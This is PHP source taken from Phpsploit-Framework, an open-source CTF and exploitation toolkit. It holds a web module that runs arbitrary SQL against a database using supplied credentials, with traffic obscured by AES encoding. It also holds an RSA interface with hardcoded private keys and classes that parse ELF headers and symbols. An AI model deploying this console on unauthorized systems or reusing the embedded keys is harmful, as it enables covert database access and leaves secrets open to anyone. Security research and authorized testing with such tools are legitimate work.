        $_domain     = Class_Base_Request ::form ( "domain" , Class_Base_Request::TYPE_STRING , Class_Base_Database::DOMAIN_LOCALHOST );
        $_port       = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , Class_Base_Database::PORT_LOCALHOST );
        $_user       = Class_Base_Request ::form ( "user_name" , Class_Base_Request::TYPE_STRING , "" );
        $_password   = Class_Base_Request ::form ( "user_password" , Class_Base_Request::TYPE_STRING , "" );
        $_string     = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        $_type       = Class_Base_Request ::form ( "type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Security::TYPE_ENCODE_CRYPTO_JS );
        $_key        = ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] );
        $_iv         = ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ] );
        $_result     = "";
        if ( ( is_string ( $_user ) ) && ( strlen ( $_user ) > 0 ) && ( is_string ( $_password ) ) && ( is_string ( $_string ) ) && ( strlen ( $_string ) > 0 ) && ( is_integer ( $_type ) ) && ( Class_Base_Security ::is_phpsploit_encode_type ( $_type ) ) && ( is_string ( $_key ) ) && ( strlen ( $_key ) > 0 ) && ( is_string ( $_iv ) ) && ( strlen ( $_iv ) > 0 ) ) {
            if ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) {
                $_user     = Class_Base_Security ::phpsploit_decode_128 ( $_user , $_key , $_iv );
                $_password = Class_Base_Security ::phpsploit_decode_128 ( $_password , $_key , $_iv );
                $_string   = Class_Base_Security ::phpsploit_decode_128 ( $_string , $_key , $_iv );
                if ( ( is_string ( $_user ) ) && ( strlen ( $_user ) > 0 ) && ( is_string ( $_password ) ) && ( is_string ( $_string ) ) && ( strlen ( $_string ) > 0 ) ) {
                    Class_Base_Database ::connect ( $_drive_type , $_domain , $_port , $_user , $_password , array ( \PDO::ATTR_ERRMODE => PDO::ERRMODE_WARNING ) );
                    $_result = Class_Base_Database ::exec_sqls_string ( $_string );
                    if ( $_result === false ) {
                        $_result = array ();
                        $_error  = Class_Base_Database ::get_error_infos ();
                    }
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] = "";
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ]  = "";
                }
            }
        }
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Database Exec</div>';
            $_form_top    .= '<div style="margin-top:32px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This function module is mainly used for SQL statement execution, please use this function with caution! Incorrect SQL execution statements may increase the performance burden of the database server and even pose data security risks! Before performing this operation, you should fully obtain legal authorization from the authorized party! Any unauthorized SQL query behavior is illegal, and you may bear the relevant legal consequences as a result! This module function can only be used for activities such as penetration testing, security auditing, and security technology research with legal authorization. Please treat it with caution!</div>';
            $_form        = array (
                "action"    => "/database/exec" ,
                "hiddens"   => array (
                    array (
                        "id"    => "encode_sql" ,
                        "name"  => "string" ,
                        "value" => "" ,
                    ) ,
                    array (
                        "id"    => "encode_user" ,
                        "name"  => "user_name" ,
                        "value" => "" ,
                    ) ,
                    array (
                        "id"    => "encode_password" ,
                        "name"  => "user_password" ,
                        "value" => "" ,
                    ) ,
                ) ,
                "selects"   => array (
                    array (
                        "id"      => "algo_type" ,
                        "title"   => "( Encode Type )   : " ,
                        "name"    => "type" ,
                        "options" => array (
                            array ( "describe" => "ENCODE_CRYPTO_JS" , "title" => "ENCODE_CRYPTO_JS" , "value" => Class_Base_Security::TYPE_ENCODE_CRYPTO_JS , "selected" => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "algo_key" ,
                        "title"    => "( Encode Key ) : " ,
                        "describe" => "key" ,
                        "name"     => "key" ,
                        "value"    => "" ,
                    ) ,
                    array (
                        "id"       => "algo_iv" ,
                        "title"    => "( Encode IV ) : " ,
                        "describe" => "iv" ,
                        "name"     => "iv" ,
                        "value"    => "" ,
                    ) ,
                    array (
                        "id"       => "algo_domain" ,
                        "title"    => "( Database domain ) : " ,
                        "describe" => "domain" ,
                        "name"     => "domain" ,
                        "value"    => $_domain ,
                    ) ,
                    array (
                        "id"       => "algo_port" ,
                        "title"    => "( Database Port ) : " ,
                        "describe" => "port" ,
                        "name"     => "port" ,
                        "value"    => $_port ,
                    ) ,
                    array (
                        "id"       => "algo_user" ,
                        "title"    => "( Database User ) : " ,
                        "describe" => "user" ,
                        "name"     => "show_user" ,
                        "value"    => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_user ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( $_user , $_key , $_iv ) ) : ( $_user ) ) ,
                    ) ,
                    array (
                        "id"       => "algo_password" ,
                        "title"    => "( Database Password ) : " ,
                        "describe" => "password" ,
                        "name"     => "show_password" ,
                        "value"    => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_password ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( $_password , $_key , $_iv ) ) : ( $_password ) ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"    => "sql_statement" ,
                        "title" => "( SQL Statement   )   : " ,
                        "name"  => "show_string" ,
                        "value" => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_string ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( $_string , $_key , $_iv ) ) : ( $_string ) ) ,
                    ) ,
                    array (
                        "id"       => "result_data" ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_result ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( print_r ( $_result , true ) , $_key , $_iv ) ) : ( $_result ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                    array (
                        "id"       => "error_data" ,
                        "title"    => "( Error Data )   : " ,
                        "name"     => "error" ,
                        "value"    => print_r ( $_error , true ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Database_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">
function init(){ 
    document.getElementById("algo_key").value=aes_key;
    document.getElementById("algo_iv").value=aes_iv; 
    if(document.getElementById("sql_statement").value!==""){
       document.getElementById("sql_statement").value=phpsploit_decode(document.getElementById("sql_statement").value,"' . $_key . '","' . $_iv . '"); 
    }
    if(document.getElementById("algo_user").value!==""){
       document.getElementById("algo_user").value=phpsploit_decode(document.getElementById("algo_user").value,"' . $_key . '","' . $_iv . '");
    }
    if(document.getElementById("algo_password").value!==""){
       document.getElementById("algo_password").value=phpsploit_decode(document.getElementById("algo_password").value,"' . $_key . '","' . $_iv . '");
    }
    if(document.getElementById("result_data").value!==""){
       document.getElementById("result_data").value=phpsploit_decode(document.getElementById("result_data").value,"' . $_key . '","' . $_iv . '");
    }
}
function to_submit(form_object){ 
    form_object.string.value=phpsploit_encode(document.getElementById("sql_statement").value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value);
    document.getElementById("sql_statement").value=""; 
    form_object.user_name.value=phpsploit_encode(document.getElementById("algo_user").value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value);
    document.getElementById("algo_user").value=""; 
    form_object.user_password.value=phpsploit_encode(document.getElementById("algo_password").value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value);
    document.getElementById("algo_password").value=""; 
    console.log(phpsploit_decode(form_object.string.value,form_object.user_name.value,form_object.user_password.value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value)); 
    document.getElementById("algo_key").value="";
    document.getElementById("algo_iv").value="";
    console.log("form is submit");
    return true;
}
</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午1:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Base_Security_Rsa extends Interface_Base
{
    const  ALGORITHM_KEY         = "RSA";
    const  ALGORITHM_CIPHER      = "RSA/ECB/PKCS1Padding";
    const  ALGORITHM_SIGNATURE   = "MD5withRSA";
    const  SIZE_MAX_ENCODE_BLOCK = 245;
    const  SIZE_INIT_KEY_PAIR    = 2048;
    const  SIZE_MAX_DECODE_BLOCK = 256;

    const   CLIENT_PRIVATE_KEY_SIZE = self::SIZE_INIT_KEY_PAIR;
    const   CLIENT_PUBLIC_KEY       = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr+/Bs8D4zLwgFd9zX4g+" .
                                      "Ec/HgjjZGbONdD6khPo+A2YGzYHEw/C/B+5m5H+lF74l00opeRSJIJ8pwWPtsfHH" .
                                      "ugMqqIz5hNTPwZlXM3KIcy+uTYRETIhfkOyayOD9EitR0ynZW+1wxW1MDDSDPrAv" .
                                      "3PYpzDXO7TSXkrBCEpHigNzpRqeq5gn2rlPstGefFR0K87/A/3SYSx5e8c2IuiPd" .
                                      "SlPy7sEphmA/kPky1V7rjpI5OrgW1/zrgn2AQJitBsslTZ/Pfmf+oe906Ry0FQfZ" .
                                      "qmD5bkufkztmUQV3zk+96yR3woe7HV6ObeXs+CtBgM1uUqF70+1kpvY8GWDfuvBy" .
                                      "ewIDAQAB";
    const   CLIENT_PRIVATE_KEY      = "MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCv78GzwPjMvCAV" .
                                      "33NfiD4Rz8eCONkZs410PqSE+j4DZgbNgcTD8L8H7mbkf6UXviXTSil5FIkgnynB" .
                                      "Y+2x8ce6AyqojPmE1M/BmVczcohzL65NhERMiF+Q7JrI4P0SK1HTKdlb7XDFbUwM" .
                                      "NIM+sC/c9inMNc7tNJeSsEISkeKA3OlGp6rmCfauU+y0Z58VHQrzv8D/dJhLHl7x" .
                                      "zYi6I91KU/LuwSmGYD+Q+TLVXuuOkjk6uBbX/OuCfYBAmK0GyyVNn89+Z/6h73Tp" .
                                      "HLQVB9mqYPluS5+TO2ZRBXfOT73rJHfCh7sdXo5t5ez4K0GAzW5SoXvT7WSm9jwZ" .
                                      "YN+68HJ7AgMBAAECggEAChzW3nUuF96MXZV9dTVIlA+EYTjRScfnTpI3NKmJnPpl" .
                                      "U7Ss0bJp2JPceC/aFnZIiE+P+LS0eRqM9N/AjuTd3RRHhG6t/POaiX894ugnba+E" .
                                      "7lG290szawoej4NXKI8y4dda9gy82axBncX68USBS8sede112m6Wc8kL0zNteIih" .
                                      "siMIlASgt1gF6ay7AaA/8axteR1/ON1BpKUnwEENDh/Da5WbswNPfaRDacOXYv30" .
                                      "9cvqxhKAmT6qfrzT4uRikPH1i0UEgFF840iMJI/dp6pzfC1znT86ERtMRT1pzblB" .
                                      "LxZfeEwKjv6BM8pBx09deq9mh/wQt8swQoyg9oiwuQKBgQDh3LVGuCt4ix8/3X6s" .
                                      "fJz7HHz6a1xieWHo7977Hkv7yzo3jOD3ShEZPrv6xUrn/EVa3VNVUWQ8pCgIp6aV" .
                                      "J9THm2y6pNNC43YSwcf0zKL3U370SFY1nonpG0CUF+qR+lmzGya3t79+onKOQ4ED" .
                                      "CdNHBfcTxvy3cjOlKhav3rMwxwKBgQDHaaAc4xnFSsZ/MR2AVUWUKVRd9A3bi7TQ" .
                                      "q8YoqZWZpwEpc5xsGBYqibXGGCo55hHiQVXELUey5S4APBehxyiOZmPXq/FO/Mr8" .
                                      "18o3+EUzYLrMOWYr3Lb48KFjtbyzCHAMvBGIJHt2EetfF+vadYpO2ROGD+PI3/RD" .
                                      "f9hjs5+krQKBgAbbss1w7jD82HgR+7S1G/csCEd6VxXOZcCy9+xcISaGJ0BkkLgx" .
                                      "kY9YrlCRCRM+P8Tgj5U5oXeN7IFGxfIlgXqGJ6kLNDcFvSIYrD+srw4fhO1Z/PQn" .
                                      "2jwvzagxibfhCDQ+ENDnTXNE74GOXy5+b+HqNnRtSGMxnovXWVUByCMlAoGAGCTq" .
                                      "1PSORzwBgp7wwnwQm5rRczq8fsuQjf9uU7gMu/jjhCBSXSghbu8TijOc0TvRCIL+" .
                                      "nm0ZFEj5Y9/iwJy7hVpSVmekJPsonKqH+nTd9BWPKHD+tOrZYJTKBaeYfFjWMESJ" .
                                      "HuHD7QzIYdAkp2O55kgUPBQqcUTkb1PIYHH8L1UCgYBk/KO7ULeeYaoCmg1YEUae" .
                                      "Lyhe7Enci3g1LHOjd8npdgtx0yCpgapEkpAOQLHoUmSreLl9g6BQLqGjfQMg9qEs" .
                                      "5VNKXQXDjNgSDAtCCGClFv8u04fYxCZwzpM6LCUPfP0tQ/9SK6DzCMP0/vJjmZnD" .
                                      "4zrWqNLuzGmeReQyiQLZCA==";
    const   SERVER_PRIVATE_KEY_SIZE = self::SIZE_INIT_KEY_PAIR;
    const   SERVER_PUBLIC_KEY       = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArJy0OKzjSBrotctJBwCe" .
                                      "3B1FrgZ9/cjzueHU3NpA4P5X9pIQ8wDf23bsqbUrVqqk773ri2pSle+iFDHubdU4" .
                                      "eJMujl8eH1TmA7vt9kOlQTNKPHCX3AY+87PlQsnqDt5ABNd7Mo7wsDNuYgC/2U2s" .
                                      "5EjifqgNRV3d/3l/DWVu+578eD006Xf87bHc3AjqkWletFPKX/4qRnHttt+smjQg" .
                                      "aWOQmsVNGCRC27jWb5pZVrnWVxHNnhwAbWTlTHokCIDg+wSWtspSmaBL1PvQWAyD" .
                                      "Q/D8zeo7I+kQSAhkYsVxckrqNZBCsPLtH7edXEplvGiHc1/5tnROtyLT06ER+VzN" .
                                      "KQIDAQAB";
    const   SERVER_PRIVATE_KEY      = "MIIEwAIBADANBgkqhkiG9w0BAQEFAASCBKowggSmAgEAAoIBAQCsnLQ4rONIGui1" .
                                      "y0kHAJ7cHUWuBn39yPO54dTc2kDg/lf2khDzAN/bduyptStWqqTvveuLalKV76IU" .
                                      "Me5t1Th4ky6OXx4fVOYDu+32Q6VBM0o8cJfcBj7zs+VCyeoO3kAE13syjvCwM25i" .
                                      "AL/ZTazkSOJ+qA1FXd3/eX8NZW77nvx4PTTpd/ztsdzcCOqRaV60U8pf/ipGce22" .
                                      "36yaNCBpY5CaxU0YJELbuNZvmllWudZXEc2eHABtZOVMeiQIgOD7BJa2ylKZoEvU" .
                                      "+9BYDIND8PzN6jsj6RBICGRixXFySuo1kEKw8u0ft51cSmW8aIdzX/m2dE63ItPT" .
                                      "oRH5XM0pAgMBAAECggEBAKlapkfk+KnKHQAgj2nbZgG4hqETpZHWE6sQs3RsfrNB" .
                                      "WLSG4zJIbVo5+EEZi4fgrSq7P9rtWlHZZ0BBLRl91YYXgdoV4MwE1Bhdzj+MZxrt" .
                                      "Y6yhG524UxNwMUOyL36e+FjHwgv8ypFWJLrq2VAvMa5ZBEAYSc0BJ8p8Pfe6yYT8" .
                                      "/15/ZcU1k5G5GQF8nF7DVKmZOtrIYqsuPHQhL+7EpHEPw+YOJKDeXmPvxzfxYx6C" .
                                      "ScA5ROFsJOpTB7S5UkL0KsZvmmCB7ipKUS6qVo+Jo7n3c+ReSbTP9xuLP/8fifyp" .
                                      "hI+lS2ov2kA42lJ4Fgk8I+h+RuCRY212yyH0Yfu48MECgYEA0/G2CitfVIrXNmso" .
                                      "u+cLP7atMzubioUrGpTv4pIGhgfdXh87wOVL2bnOd3OJxneqEtMUgEEdbvHfC9lF" .
                                      "WDk3A0fQ14C/+Ro6GjxN6RbkCR0hP/nlQi4VCoNgNevlCddlmrbDEEMn96xqn/6o" .
                                      "DjWqgBBtyOa6qm4hWp6ZJZxr6E0CgYEA0H3/NhAldWlxzX7aCyuedjXT7ZW6nyrf" .
                                      "weBBBi6itI4xqV+9S1rCHj4H8qExOXNutaqcwiIVG/m3LZWqI12/PrDiLI3aAWnl" .
                                      "5rYko0soj0k+zz0WEWzY/dbdvYMoKPAhVAubKcylqO3FLyKa70H/9ItXCFFfVD+6" .
                                      "db+VW0hepk0CgYEAtVxQecNDgASOxHJOGPxME+ktrHmFT7NEfyqTWz25d1ejhbcU" .
                                      "WqvbjCQDGRQ1AS/EyPb2xAj0NsuiIXF6dVQATz5U5xO1MmPO9ERGJv7/gwz6NtSP" .
                                      "6WGlf6mL2phRFWrL9ugNYw0UVkujseUnyYECtTNZvmAxu0UiJXkxc422iMECgYEA" .
                                      "v8IzGhFtsnjCL+QtPbrnqwfFHS7qj3yKgrH0fHAmO/TQnlytKQKXqeMZwkIZmSKf" .
                                      "P71lInTgf3OE1AtkidSukkV0MNBjI4u35SO/vOTisC8I8ujXRD2dspKOLcDVDhoW" .
                                      "PUvTcXWFJENUag7k+4vzk4MZEFBvYnie0a/c+jEsxL0CgYEAzRMAM9wNPrwcOfm4" .
                                      "SiyjdEpDaGfEI6ywdv79koIsV1UjTSeBA9pRW4002giY97EbWHfoBgbBuosBEhF8" .
                                      "s2wt/d/5oOzJzaplGBWnnwfsZ2nO1l4jagZVITHo1kKVVR1/gCUBKyHG1YN73T0k" .
                                      "zP5a/aenVuzsG3mqTWlVYXcC8c4=";
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-4
 * Time: 下午10:21
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64_Sym extends Class_Base
{
    const SIZE_ST_NAME  = ( Class_Base_Elf64::SIZE_ELF64_WORD );
    const SIZE_ST_INFO  = ( Class_Base_Elf64::SIZE_UNSIGNED_CHAR );
    const SIZE_ST_OTHER = ( Class_Base_Elf64::SIZE_UNSIGNED_CHAR );
    const SIZE_ST_SHNDX = ( Class_Base_Elf64::SIZE_ELF64_HALF );
    const SIZE_ST_VALUE = ( Class_Base_Elf64::SIZE_ELF64_ADDR );
    const SIZE_ST_SIZE  = ( Class_Base_Elf64::SIZE_ELF64_XWORD );

    const PURPOSE_ST_NAME  = "";
    const PURPOSE_ST_INFO  = "";
    const PURPOSE_ST_OTHER = "";
    const PURPOSE_ST_SHNDX = "";
    const PURPOSE_ST_VALUE = "";
    const PURPOSE_ST_SIZE  = "";

    private static $_elf64_syms = array ();

    public $st_name  = null;
    public $st_info  = null;
    public $st_other = null;
    public $st_shndx = null;
    public $st_value = null;
    public $st_size  = null;

    public static function get_sym_size ()
    {
        $_sym_size = ( self::SIZE_ST_NAME + self::SIZE_ST_INFO + self::SIZE_ST_OTHER + self::SIZE_ST_SHNDX + self::SIZE_ST_VALUE + self::SIZE_ST_SIZE );
        return $_sym_size;
    }

    public static function get_st_name_offset ()
    {
        $_offset = ( Class_Base_Elf::OFFSET_START );
        return $_offset;
    }

    public static function get_st_info_offset ()
    {
        $_offset = ( self::get_st_name_offset () + self::SIZE_ST_NAME );
        return $_offset;
    }

    public static function get_st_other_offset ()
    {
        $_offset = ( self::get_st_info_offset () + self::SIZE_ST_INFO );
        return $_offset;
    }

    public static function get_st_shndx_offset ()
    {
        $_offset = ( self::get_st_other_offset () + self::SIZE_ST_OTHER );
        return $_offset;
    }

    public static function get_st_value_offset ()
    {
        $_offset = ( self::get_st_shndx_offset () + self::SIZE_ST_SHNDX );
        return $_offset;
    }

    public static function get_st_size_offset ()
    {
        $_offset = ( self::get_st_value_offset () + self::SIZE_ST_VALUE );
        return $_offset;
    }


    public static function create_elf64_sym ( $filepath , $st_name , $st_info , $st_other , $st_shndx , $st_value , $st_size )
    {
        self::$_elf64_syms[ $filepath ] = new Class_Base_Elf64_Sym( $st_name , $st_info , $st_other , $st_shndx , $st_value , $st_size );
    }

    public function __construct ( $st_name , $st_info , $st_other , $st_shndx , $st_value , $st_size )
    {
        $this->st_name  = $st_name;
        $this->st_info  = $st_info;
        $this->st_other = $st_other;
        $this->st_shndx = $st_shndx;
        $this->st_value = $st_value;
        $this->st_size  = $st_size;
    }

    public function __destruct ()
    {
        $this->st_name  = null;
        $this->st_info  = null;
        $this->st_other = null;
        $this->st_shndx = null;
        $this->st_value = null;
        $this->st_size  = null;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-4
 * Time: 上午9:54
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf extends Class_Base
{
    const PT_NULL    = 0;
    const PT_LOAD    = 1;
    const PT_DYNAMIC = 2;
    const PT_INTERP  = 3;
    const PT_NOTE    = 4;
    const PT_SHLIB   = 5;
    const PT_PHDR    = 6;
    const PT_LOPROC  = 0x70000000;
    const PT_HIPROC  = 0x7fffffff;

    const SH_TYPE_SHT_NULL           = 0;
    const SH_TYPE_SHT_PROGBITS       = 1;
    const SH_TYPE_SHT_SYMTAB         = 2;
    const SH_TYPE_SHT_STRTAB         = 3;
    const SH_TYPE_SHT_RELA           = 4;
    const SH_TYPE_SHT_HASH           = 5;
    const SH_TYPE_SHT_DYNAMIC        = 6;
    const SH_TYPE_SHT_NOTE           = 7;
    const SH_TYPE_SHT_NOBITS         = 8;
    const SH_TYPE_SHT_REL            = 9;
    const SH_TYPE_SHT_SHLIB          = 10;
    const SH_TYPE_SHT_DYNSYM         = 11;
    const SH_TYPE_SHT_INIT_ARRAY     = 14;
    const SH_TYPE_SHT_FINI_ARRAY     = 15;
    const SH_TYPE_SHT_PREINIT_ARRAY  = 16;
    const SH_TYPE_SHT_GROUP          = 17;
    const SH_TYPE_SHT_SYMTAB_SHNDX   = 18;
    const SH_TYPE_SHT_NUM            = 19;
    const SH_TYPE_SHT_LOOS           = 0x60000000;
    const SH_TYPE_SHT_GNU_ATTRIBUTES = 0x6ffffff5;
    const SH_TYPE_SHT_GNU_HASH       = 0x6ffffff6;
    const SH_TYPE_SHT_GNU_LIBLIST    = 0x6ffffff7;
    const SH_TYPE_SHT_CHECKSUM       = 0x6ffffff8;
    const SH_TYPE_SHT_LOSUNW         = 0x6ffffffa;
    const SH_TYPE_SHT_SUNW_MOVE      = 0x6ffffffa;
    const SH_TYPE_SHT_SUNW_COMDAT    = 0x6ffffffb;
    const SH_TYPE_SHT_SUNW_SYMINFO   = 0x6ffffffc;
    const SH_TYPE_SHT_GNU_VERDEF     = 0x6ffffffd;
    const SH_TYPE_SHT_GNU_VERNEED    = 0x6ffffffe;
    const SH_TYPE_SHT_GNU_VERSYM     = 0x6fffffff;
    const SH_TYPE_SHT_HISUNW         = 0x6fffffff;
    const SH_TYPE_SHT_HIOS           = 0x6fffffff;
    const SH_TYPE_SHT_LOPROC         = 0x70000000;
    const SH_TYPE_SHT_HIPROC         = 0x7fffffff;
    const SH_TYPE_SHT_LOUSER         = 0x80000000;
    const SH_TYPE_SHT_HIUSER         = 0x8fffffff;

    private static $_pt_type_names = array (
        self::PT_NULL    => 'null' ,
        self::PT_LOAD    => 'load' ,
        self::PT_DYNAMIC => 'dynamic' ,
        self::PT_INTERP  => 'intep' ,
        self::PT_NOTE    => 'note' ,
        self::PT_SHLIB   => 'shlib' ,
        self::PT_PHDR    => 'phor' ,
        self::PT_LOPROC  => 'loproc' ,
        self::PT_HIPROC  => 'hiproc' ,
    );

    private static $_sh_type_names = array (
        self::SH_TYPE_SHT_NULL           => 'null' ,
        self::SH_TYPE_SHT_PROGBITS       => 'progbits' ,
        self::SH_TYPE_SHT_SYMTAB         => 'symtab' ,
        self::SH_TYPE_SHT_STRTAB         => 'strtab' ,
        self::SH_TYPE_SHT_RELA           => 'rela' ,
        self::SH_TYPE_SHT_HASH           => 'hash' ,
        self::SH_TYPE_SHT_DYNAMIC        => 'dynamic' ,
        self::SH_TYPE_SHT_NOTE           => 'note' ,
        self::SH_TYPE_SHT_NOBITS         => 'nobits' ,
        self::SH_TYPE_SHT_REL            => 'rel' ,
        self::SH_TYPE_SHT_SHLIB          => 'shlib' ,
        self::SH_TYPE_SHT_DYNSYM         => 'dynsym' ,
        self::SH_TYPE_SHT_INIT_ARRAY     => 'init_array' ,
        self::SH_TYPE_SHT_FINI_ARRAY     => 'fini_array' ,
        self::SH_TYPE_SHT_PREINIT_ARRAY  => 'preinit_array' ,
        self::SH_TYPE_SHT_GROUP          => 'group' ,
        self::SH_TYPE_SHT_SYMTAB_SHNDX   => 'symtab_shndx' ,
        self::SH_TYPE_SHT_NUM            => 'num' ,
        self::SH_TYPE_SHT_LOOS           => 'loos' ,
        self::SH_TYPE_SHT_GNU_ATTRIBUTES => 'gnu_attributes' ,
        self::SH_TYPE_SHT_GNU_HASH       => 'gnu_hash' ,
        self::SH_TYPE_SHT_GNU_LIBLIST    => 'gnu_liblist' ,
        self::SH_TYPE_SHT_CHECKSUM       => 'checksum' ,
        self::SH_TYPE_SHT_LOSUNW         => 'losunw' ,
        self::SH_TYPE_SHT_SUNW_MOVE      => 'sunw_move' ,
        self::SH_TYPE_SHT_SUNW_COMDAT    => 'sunw_comdat' ,
        self::SH_TYPE_SHT_SUNW_SYMINFO   => 'sunw_syminfo' ,
        self::SH_TYPE_SHT_GNU_VERDEF     => 'gnu_verdef' ,
        self::SH_TYPE_SHT_GNU_VERNEED    => 'gnu_verneed' ,
        self::SH_TYPE_SHT_GNU_VERSYM     => 'gnu_versym' ,
        self::SH_TYPE_SHT_HISUNW         => 'hisunw' ,
        self::SH_TYPE_SHT_HIOS           => 'hios' ,
        self::SH_TYPE_SHT_LOPROC         => 'loproc' ,
        self::SH_TYPE_SHT_HIPROC         => 'hiproc' ,
        self::SH_TYPE_SHT_LOUSER         => 'louser' ,
        self::SH_TYPE_SHT_HIUSER         => 'hiuser' ,
    );


    const FLAG_FORMAT_ELF  = '\x7f\x45\x4c\x46';
    const VALUE_ELFCLASS32 = 1;
    const VALUE_ELFCLASS64 = 2;

    const OFFSET_START = 0;

    private static $_values_elf_class = array ( self::VALUE_ELFCLASS32 , self::VALUE_ELFCLASS64 );

    public static function get_pt_type_name ( $pt_type )
    {
        $_pt_type_name = "unknown";
        if ( ! empty( self::$_pt_type_names[ $pt_type ] ) ) {
            return self::$_pt_type_names[ $pt_type ];
        }
        $pt_type = intval ( $pt_type );
        if ( ( $pt_type > 0x70000000 ) && ( $pt_type < 0x7fffffff ) ) {
            return "processor_specific_semantics";
        }
        return $_pt_type_name;
    }

    public static function get_sh_type_name ( $sh_type )
    {
        $_sh_type_name = "unknown";
        if ( ! empty( self::$_sh_type_names[ $sh_type ] ) ) {
            return self::$_sh_type_names[ $sh_type ];
        }
        return $_sh_type_name;
    }


    public static function is_elf_format ( $data )
    {
        if ( ( is_string ( $data ) ) && ( strlen ( $data ) >= 4 ) ) {
            $_magic_number      = substr ( $data , 0 , 4 );
            $_magic_number_hexs = Class_Base_Format::get_format_hex_content ( $_magic_number );
            if ( $_magic_number_hexs == self::FLAG_FORMAT_ELF ) {
                return true;
            }
        }
        return false;
    }

    public static function is_elf_machine ( $e_machine )
    {
        if ( is_integer ( $e_machine ) && ( $e_machine > 0 ) && ( $e_machine < 111 ) ) {
            return true;
        }
        return false;
    }

    public static function is_ei_class ( $ei_class )
    {
        $_exist = in_array ( $ei_class , self::$_values_elf_class );
        return $_exist;
    }

    public static function pack ( $data , $format = "a*" )
    {
        $_data = pack ( $format , $data );
        return $_data;
    }

    public static function unpack ( $data , $format = "a*" )
    {
        $_data = unpack ( $format , $data );
        if ( is_array ( $_data ) ) {
            $_data = $_data[ 1 ];
        }
        return $_data;
    }

